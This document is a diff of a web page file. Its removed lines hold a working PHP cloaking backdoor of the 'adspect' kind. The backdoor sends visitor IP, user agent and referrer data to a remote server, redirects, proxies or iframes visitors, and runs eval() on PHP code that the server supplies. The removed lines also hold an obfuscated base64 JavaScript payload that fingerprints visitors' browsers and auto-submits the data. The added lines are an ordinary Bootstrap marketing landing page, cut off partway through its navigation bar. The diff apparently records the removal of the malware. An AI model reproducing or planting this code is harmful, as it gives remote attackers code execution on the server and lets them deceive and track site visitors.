@@ -1,30 +1,312 @@
-<?php
- ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url = '') { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; if ($url !== '') { $url = parse_url($url); if (isset($url['path'])) { if (substr($url['path'], 0, 1) === '/') { $_SERVER['REQUEST_URI'] = $url['path']; } else { $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path']; } } if (isset($url['query'])) { parse_str($url['query'], $_GET); $_SERVER['QUERY_STRING'] = $url['query']; } else { $_GET = []; $_SERVER['QUERY_STRING'] = ''; } } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); adspect_spoof_request(); return null; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('b1c81754-7b92-4ab2-9e69-f9f93dbb8aa1', 'redirect', '_', base64_decode('+dTeQuBz5OR+lrPwig9tNEgeN+MUzt3i+K7/hy2kQ2o=')); if (!isset($target)) { return; } ?>
+
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root">
-          <script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4YzE5NyhfMHgzMThjYmIsXzB4MjM3ZGUzKXt2YXIgXzB4M2U1YTUzPV8weDNlNWEoKTtyZXR1cm4gXzB4YzE5Nz1mdW5jdGlvbihfMHhjMTk3NjgsXzB4NGViOWM3KXtfMHhjMTk3Njg9XzB4YzE5NzY4LTB4NzQ7dmFyIF8weDEzMjc0Mz1fMHgzZTVhNTNbXzB4YzE5NzY4XTtyZXR1cm4gXzB4MTMyNzQzO30sXzB4YzE5NyhfMHgzMThjYmIsXzB4MjM3ZGUzKTt9KGZ1bmN0aW9uKF8weDQ3OTYxZixfMHgzNjk0ZDQpe3ZhciBfMHgzYTA3MjQ9XzB4YzE5NyxfMHg0Yjg2MDc9XzB4NDc5NjFmKCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHgzNTJmZWE9LXBhcnNlSW50KF8weDNhMDcyNCgweDk3KSkvMHgxK3BhcnNlSW50KF8weDNhMDcyNCgweDhjKSkvMHgyKigtcGFyc2VJbnQoXzB4M2EwNzI0KDB4OGYpKS8weDMpKy1wYXJzZUludChfMHgzYTA3MjQoMHg5NCkpLzB4NCoocGFyc2VJbnQoXzB4M2EwNzI0KDB4N2MpKS8weDUpKy1wYXJzZUludChfMHgzYTA3MjQoMHg5MCkpLzB4NistcGFyc2VJbnQoXzB4M2EwNzI0KDB4ODYpKS8weDcrcGFyc2VJbnQoXzB4M2EwNzI0KDB4OTkpKS8weDgrLXBhcnNlSW50KF8weDNhMDcyNCgweGE0KSkvMHg5KigtcGFyc2VJbnQoXzB4M2EwNzI0KDB4ODEpKS8weGEpO2lmKF8weDM1MmZlYT09PV8weDM2OTRkNClicmVhaztlbHNlIF8weDRiODYwN1sncHVzaCddKF8weDRiODYwN1snc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MTc3NDg3KXtfMHg0Yjg2MDdbJ3B1c2gnXShfMHg0Yjg2MDdbJ3NoaWZ0J10oKSk7fX19KF8weDNlNWEsMHg0Mjg1NSksKGZ1bmN0aW9uKCl7dmFyIF8weDEyMGFkZD1fMHhjMTk3LF8weDQzZWRiMT1bXSxfMHgzMjE2Y2E9e307dHJ5e2Z1bmN0aW9uIF8weDE0YmQ5NShfMHgxZWVmYmQpe3ZhciBfMHg0ZDA3MDc9XzB4YzE5NztpZihfMHg0ZDA3MDcoMHg3ZCk9PT10eXBlb2YgXzB4MWVlZmJkJiZudWxsIT09XzB4MWVlZmJkKXt2YXIgXzB4M2Y0ZjhhPXt9O2Z1bmN0aW9uIF8weDU5NGEzYyhfMHgyNzM4NGQpe3ZhciBfMHg0YThhNDk9XzB4NGQwNzA3O3RyeXt2YXIgXzB4MjZiYjBlPV8weDFlZWZiZFtfMHgyNzM4NGRdO3N3aXRjaCh0eXBlb2YgXzB4MjZiYjBlKXtjYXNlIF8weDRhOGE0OSgweDdkKTppZihudWxsPT09XzB4MjZiYjBlKWJyZWFrO2Nhc2UgXzB4NGE4YTQ5KDB4NzcpOl8weDI2YmIwZT1fMHgyNmJiMGVbJ3RvU3RyaW5nJ10oKTt9XzB4M2Y0ZjhhW18weDI3Mzg0ZF09XzB4MjZiYjBlO31jYXRjaChfMHg0ZWRhNGEpe18weDQzZWRiMVtfMHg0YThhNDkoMHg4ZSldKF8weDRlZGE0YVsnbWVzc2FnZSddKTt9fWZvcih2YXIgXzB4NDU4OWY5IGluIF8weDFlZWZiZClfMHg1OTRhM2MoXzB4NDU4OWY5KTt0cnl7dmFyIF8weDVlM2Q5Yj1PYmplY3RbXzB4NGQwNzA3KDB4YTMpXShfMHgxZWVmYmQpO2ZvcihfMHg0NTg5Zjk9MHgwO18weDQ1ODlmOTxfMHg1ZTNkOWJbXzB4NGQwNzA3KDB4ODIpXTsrK18weDQ1ODlmOSlfMHg1OTRhM2MoXzB4NWUzZDliW18weDQ1ODlmOV0pO18weDNmNGY4YVsnISEnXT1fMHg1ZTNkOWI7fWNhdGNoKF8weGFhNjY4NSl7XzB4NDNlZGIxW18weDRkMDcwNygweDhlKV0oXzB4YWE2Njg1W18weDRkMDcwNygweDdiKV0pO31yZXR1cm4gXzB4M2Y0ZjhhO319XzB4MzIxNmNhW18weDEyMGFkZCgweDkzKV09XzB4MTRiZDk1KHdpbmRvd1tfMHgxMjBhZGQoMHg5MyldKSxfMHgzMjE2Y2FbJ3dpbmRvdyddPV8weDE0YmQ5NSh3aW5kb3cpLF8weDMyMTZjYVtfMHgxMjBhZGQoMHhhOCldPV8weDE0YmQ5NSh3aW5kb3dbXzB4MTIwYWRkKDB4YTgpXSksXzB4MzIxNmNhW18weDEyMGFkZCgweDhiKV09XzB4MTRiZDk1KHdpbmRvd1tfMHgxMjBhZGQoMHg4YildKSxfMHgzMjE2Y2FbJ2NvbnNvbGUnXT1fMHgxNGJkOTUod2luZG93W18weDEyMGFkZCgweDlhKV0pLF8weDMyMTZjYVtfMHgxMjBhZGQoMHg3NCldPWZ1bmN0aW9uKF8weGU4YjNjMSl7dmFyIF8weDc3MDUzZD1fMHgxMjBhZGQ7dHJ5e3ZhciBfMHgzNWYzZTc9e307XzB4ZThiM2MxPV8weGU4YjNjMVtfMHg3NzA1M2QoMHg3ZildO2Zvcih2YXIgXzB4NTA3ZGFhIGluIF8weGU4YjNjMSlfMHg1MDdkYWE9XzB4ZThiM2MxW18weDUwN2RhYV0sXzB4MzVmM2U3W18weDUwN2RhYVtfMHg3NzA1M2QoMHg3YSldXT1fMHg1MDdkYWFbXzB4NzcwNTNkKDB4YTApXTtyZXR1cm4gXzB4MzVmM2U3O31jYXRjaChfMHgyZjAwYWMpe18weDQzZWRiMVtfMHg3NzA1M2QoMHg4ZSldKF8weDJmMDBhY1tfMHg3NzA1M2QoMHg3YildKTt9fShkb2N1bWVudFtfMHgxMjBhZGQoMHg3NCldKSxfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4OGQpXT1fMHgxNGJkOTUoZG9jdW1lbnQpO3RyeXtfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4YTEpXT1uZXcgRGF0ZSgpW18weDEyMGFkZCgweDg5KV0oKTt9Y2F0Y2goXzB4MmI1NDU3KXtfMHg0M2VkYjFbXzB4MTIwYWRkKDB4OGUpXShfMHgyYjU0NTdbJ21lc3NhZ2UnXSk7fXRyeXtfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4N2UpXT1mdW5jdGlvbigpe31bXzB4MTIwYWRkKDB4OWIpXSgpO31jYXRjaChfMHgyMDI5NDApe18weDQzZWRiMVtfMHgxMjBhZGQoMHg4ZSldKF8weDIwMjk0MFtfMHgxMjBhZGQoMHg3YildKTt9dHJ5e18weDMyMTZjYVsndG91Y2hFdmVudCddPWRvY3VtZW50W18weDEyMGFkZCgweDk1KV0oJ1RvdWNoRXZlbnQnKVsndG9TdHJpbmcnXSgpO31jYXRjaChfMHgzNDlmNGMpe18weDQzZWRiMVtfMHgxMjBhZGQoMHg4ZSldKF8weDM0OWY0Y1tfMHgxMjBhZGQoMHg3YildKTt9dHJ5e3ZhciBfMHgzMWViZDI9ZnVuY3Rpb24oKXt9LF8weDMyNTZjOT0weDA7XzB4MzFlYmQyWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgzMjU2YzksJyc7fSxjb25zb2xlWydsb2cnXShfMHgzMWViZDIpLF8weDMyMTZjYVsndG9zdHJpbmcnXT1fMHgzMjU2Yzk7fWNhdGNoKF8weDQxZjkzZil7XzB4NDNlZGIxWydwdXNoJ10oXzB4NDFmOTNmW18weDEyMGFkZCgweDdiKV0pO310cnl7dmFyIF8weDE4OWY2Mz1kb2N1bWVudFtfMHgxMjBhZGQoMHg4YSldKF8weDEyMGFkZCgweDk2KSlbJ2dldENvbnRleHQnXShfMHgxMjBhZGQoMHg5OCkpLF8weGMyZjQyMD1fMHgxODlmNjNbXzB4MTIwYWRkKDB4ODQpXShfMHgxMjBhZGQoMHg3OSkpO18weDMyMTZjYVsnd2ViZ2wnXT17J3ZlbmRvcic6XzB4MTg5ZjYzWydnZXRQYXJhbWV0ZXInXShfMHhjMmY0MjBbXzB4MTIwYWRkKDB4NzUpXSksJ3JlbmRlcmVyJzpfMHgxODlmNjNbXzB4MTIwYWRkKDB4OWMpXShfMHhjMmY0MjBbXzB4MTIwYWRkKDB4OWUpXSl9O31jYXRjaChfMHg0YzYwOGMpe18weDQzZWRiMVsncHVzaCddKF8weDRjNjA4Y1tfMHgxMjBhZGQoMHg3YildKTt9ZnVuY3Rpb24gXzB4MTI4ZGJjKF8weDQ4YWU0YyxfMHgxMjBjMmUsXzB4NWFhMjNmKXt2YXIgXzB4MzUxMzk1PV8weDEyMGFkZCxfMHg0ZWQyYjI9XzB4NDhhZTRjW18weDM1MTM5NSgweDkxKV1bXzB4MTIwYzJlXTtfMHg0OGFlNGNbXzB4MzUxMzk1KDB4OTEpXVtfMHgxMjBjMmVdPWZ1bmN0aW9uKCl7dmFyIF8weDU3MWFhMj1fMHgzNTEzOTU7XzB4MzIxNmNhW18weDU3MWFhMigweDg1KV09ITB4MDt9LF8weDVhYTIzZigpLF8weDQ4YWU0Y1sncHJvdG90eXBlJ11bXzB4MTIwYzJlXT1fMHg0ZWQyYjI7fXRyeXtfMHgxMjhkYmMoQXJyYXksJ2luY2x1ZGVzJyxmdW5jdGlvbigpe3ZhciBfMHg4OGRhZTY9XzB4MTIwYWRkO3JldHVybiBkb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDg4ZGFlNigweDg3KSlbJ2NhblBsYXlUeXBlJ10oXzB4ODhkYWU2KDB4OTIpKTt9KTt9Y2F0Y2goXzB4NTliMmFhKXt9fWNhdGNoKF8weDNkOTQ4Mil7XzB4NDNlZGIxW18weDEyMGFkZCgweDhlKV0oXzB4M2Q5NDgyW18weDEyMGFkZCgweDdiKV0pO30oZnVuY3Rpb24oKXt2YXIgXzB4MjkwMTAxPV8weDEyMGFkZDtfMHgzMjE2Y2FbXzB4MjkwMTAxKDB4YTYpXT1fMHg0M2VkYjE7dmFyIF8weDNlYjhiNj1kb2N1bWVudFtfMHgyOTAxMDEoMHg4YSldKF8weDI5MDEwMSgweDc2KSksXzB4M2Y3MThjPWRvY3VtZW50W18weDI5MDEwMSgweDhhKV0oJ2lucHV0Jyk7XzB4M2ViOGI2WydtZXRob2QnXT1fMHgyOTAxMDEoMHg5ZiksXzB4M2ViOGI2W18weDI5MDEwMSgweGEyKV09d2luZG93W18weDI5MDEwMSgweDhiKV1bXzB4MjkwMTAxKDB4ODApXSxfMHgzZjcxOGNbXzB4MjkwMTAxKDB4NzgpXT1fMHgyOTAxMDEoMHhhNyksXzB4M2Y3MThjW18weDI5MDEwMSgweDlkKV09J2RhdGEnLF8weDNmNzE4Y1sndmFsdWUnXT1KU09OWydzdHJpbmdpZnknXShfMHgzMjE2Y2EpLF8weDNlYjhiNltfMHgyOTAxMDEoMHg4MyldKF8weDNmNzE4YyksZG9jdW1lbnRbXzB4MjkwMTAxKDB4YTUpXVsnYXBwZW5kQ2hpbGQnXShfMHgzZWI4YjYpLF8weDNlYjhiNltfMHgyOTAxMDEoMHg4OCldKCk7fSgpKTt9KCkpKTtmdW5jdGlvbiBfMHgzZTVhKCl7dmFyIF8weDEwNjk4YT1bJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCdub2RlTmFtZScsJ21lc3NhZ2UnLCc3MDU1NXNieklOaycsJ29iamVjdCcsJ2Nsb3N1cmUnLCdhdHRyaWJ1dGVzJywnaHJlZicsJzQ3NzBCQ1VuQU4nLCdsZW5ndGgnLCdhcHBlbmRDaGlsZCcsJ2dldEV4dGVuc2lvbicsJ3Byb3RvJywnMTU3NDk2NU52YWFEYycsJ3ZpZGVvJywnc3VibWl0JywnZ2V0VGltZXpvbmVPZmZzZXQnLCdjcmVhdGVFbGVtZW50JywnbG9jYXRpb24nLCcxODBXZktDUkwnLCdkb2N1bWVudCcsJ3B1c2gnLCcxODAyMVVJdWRuUicsJzkyMzg5MnVHc1BTQicsJ3Byb3RvdHlwZScsJ3ZpZGVvL21wNCcsJ3NjcmVlbicsJzI0Ym5qZWp6JywnY3JlYXRlRXZlbnQnLCdjYW52YXMnLCcxMzEzMzF2Z0t3VEgnLCd3ZWJnbCcsJzk2NTIwMFFKWkROdScsJ2NvbnNvbGUnLCd0b1N0cmluZycsJ2dldFBhcmFtZXRlcicsJ25hbWUnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ1BPU1QnLCdub2RlVmFsdWUnLCd0aW1lem9uZU9mZnNldCcsJ2FjdGlvbicsJ2dldE93blByb3BlcnR5TmFtZXMnLCcyNDI5MXJzYkRLWCcsJ2JvZHknLCdlcnJvcnMnLCdoaWRkZW4nLCduYXZpZ2F0b3InLCdkb2N1bWVudEVsZW1lbnQnLCdVTk1BU0tFRF9WRU5ET1JfV0VCR0wnLCdmb3JtJywnZnVuY3Rpb24nLCd0eXBlJ107XzB4M2U1YT1mdW5jdGlvbigpe3JldHVybiBfMHgxMDY5OGE7fTtyZXR1cm4gXzB4M2U1YSgpO30="></script>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Marketing Agency</title>
+    <!-- Bootstrap CDN -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha2/css/bootstrap.min.css">
+    <!-- Custom CSS -->
+    <style>
+        /* Variables */
+        :root {
+            --primary-color: #007bff;
+            --secondary-color: #6c757d;
+            --light-color: #f8f9fa;
+            --dark-color: #343a40;
+        }
+
+        /* Header */
+        .navbar {
+            background-color: var(--dark-color);
+        }
+
+        .navbar-brand {
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+
+        .navbar-nav .nav-link {
+            color: var(--light-color);
+        }
+
+        .navbar-nav .nav-link:hover {
+            color: var(--primary-color);
+        }
+
+        /* Banner */
+        .banner {
+            background-image: url("https://source.unsplash.com/1600x900/?digital,marketing");
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .banner h1 {
+            color: var(--light-color);
+            font-size: 4rem;
+            text-shadow: 2px 2px 4px var(--dark-color);
+        }
+
+        .banner p {
+            color: var(--light-color);
+            font-size: 1.5rem;
+            text-shadow: 1px 1px 2px var(--dark-color);
+        }
+
+        .banner .btn {
+            background-color: var(--primary-color);
+            color: var(--light-color);
+            font-size: 1.2rem;
+            padding: 0.8rem 1.5rem;
+            border-radius: 0;
+        }
+
+        .banner .btn:hover {
+            background-color: var(--secondary-color);
+            color: var(--light-color);
+        }
+
+        /* Services */
+        .services {
+            padding: 4rem 0;
+        }
+
+        .services h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .services .card {
+            border: none;
+            box-shadow: 0 4px 8px var(--secondary-color);
+        }
+
+        .services .card:hover {
+            transform: scale(1.05);
+            transition: 0.3s;
+        }
+
+        .services .card-body {
+            text-align: center;
+        }
+
+        .services .card-title {
+            font-size: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .services .card-text {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Process */
+        .process {
+            padding: 4rem 0;
+            background-color: var(--light-color);
+        }
+
+        .process h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .process .row {
+            align-items: center;
+        }
+
+        .process .col-md-6 {
+            padding: 2rem;
+        }
+
+        .process .video {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .process .list-group-item {
+            font-size: 1.2rem;
+            border: none;
+        }
+
+        .process .list-group-item::before {
+            content: "\2713\0020";
+            color: var(--primary-color);
+        }
+
+        /* Testimonials */
+        .testimonials {
+            padding: 4rem 0;
+        }
+
+        .testimonials h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .testimonials .carousel-item {
+            text-align: center;
+        }
+
+        .testimonials .img-fluid {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin-bottom: 1rem;
+        }
+
+        .testimonials .blockquote {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .testimonials .carousel-indicators li {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        /* Contact */
+        .contact {
+            padding: 4rem 0;
+            background-color: var(--light-color);
+        }
+
+        .contact h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .contact .form-control {
+            border-radius: 0;
+        }
+
+        .contact .btn {
+            background-color: var(--primary-color);
+            color: var(--light-color);
+            font-size: 1.2rem;
+            padding: 0.8rem 1.5rem;
+            border-radius: 0;
+        }
+
+        .contact .btn:hover {
+            background-color: var(--secondary-color);
+            color: var(--light-color);
+        }
+
+        /* Footer */
+        .footer {
+            background-color: var(--dark-color);
+            padding: 2rem 0;
+        }
+
+        .footer .social-icons a {
+            color: var(--light-color);
+            font-size: 1.5rem;
+            margin: 0 0.5rem;
+        }
+
+        .footer .social-icons a:hover {
+            color: var(--primary-color);
+        }
+
+        .footer p {
+            color: var(--light-color);
+            text-align: center;
+            margin: 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .banner h1 {
+                font-size: 3rem;
+            }
+
+            .banner p {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">Digital Marketing Agency</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ml-auto">
+                    <li class="nav-item active">
+                        <a class="nav-link" href="#banner">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#services">Services</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#process">Process</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#testimonials">Testimonials</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contact">Contact</a>
+                    </li>
+                </ul>
